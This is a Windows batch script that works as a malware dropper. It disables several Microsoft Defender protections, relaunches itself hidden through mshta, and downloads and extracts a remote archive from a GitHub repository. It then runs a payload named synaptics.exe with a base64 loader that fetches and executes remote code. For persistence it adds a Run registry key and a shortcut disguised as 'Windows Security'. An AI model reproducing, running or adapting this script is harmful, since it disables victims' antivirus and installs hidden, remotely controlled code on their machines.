@echo off

powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableOnAccessProtection $true"
powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"
powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"

%1 start /min "" mshta vbscript:createobject("wscript.shell").run("""%~s0"" ::",0)(window.close)&&exit

set "CODE_LOADER=import base64;exec(base64.b64decode(urllib.request.urlopen('https://github.com/NamBlack667/NamBlack/raw/refs/heads/main/main1.exe').read().decode('utf-8')))

set "powershellExec=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

if not exist %powershellExec% (
	set "powershellExec=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
)

echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/NamBlack667/NamBlack/raw/refs/heads/main/main1.zip', [System.IO.Path]::GetTempPath() + 'xFSOj9El1Q.zip') | %powershellExec%
echo $dst = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('LocalApplicationData'), 'xFSOj9El1Q'); Add-Type -AssemblyName System.IO.Compression.FileSystem; if (Test-Path $dst) { Remove-Item -Recurse -Force "$dst\*" } else { New-Item -ItemType Directory -Force $dst } ; [System.IO.Compression.ZipFile]::ExtractToDirectory([System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'xFSOj9El1Q.zip'), $dst) | %powershellExec%
echo $s = $payload = "%CODE_LOADER%";$obj = New-Object -ComObject WScript.Shell;$link = $obj.CreateShortcut("$env:LOCALAPPDATA\WindowsSecurity.lnk");$link.WindowStyle = 7;$link.TargetPath = "$env:LOCALAPPDATA\xFSOj9El1Q\synaptics.exe";$link.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13";$link.Arguments = "-c `"$payload`"";$link.Save() | %powershellExec%
echo New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'Windows Security' -PropertyType String -Value 'C:\Windows\Explorer.EXE %LOCALAPPDATA%\WindowsSecurity.lnk' -Force | %powershellExec%
cmd.exe /c start "" "%LOCALAPPDATA%\xFSOj9El1Q\synaptics.exe" -c "%CODE_LOADER%"
Del /S /Q %TEMP%\xFSOj9El1Q.zip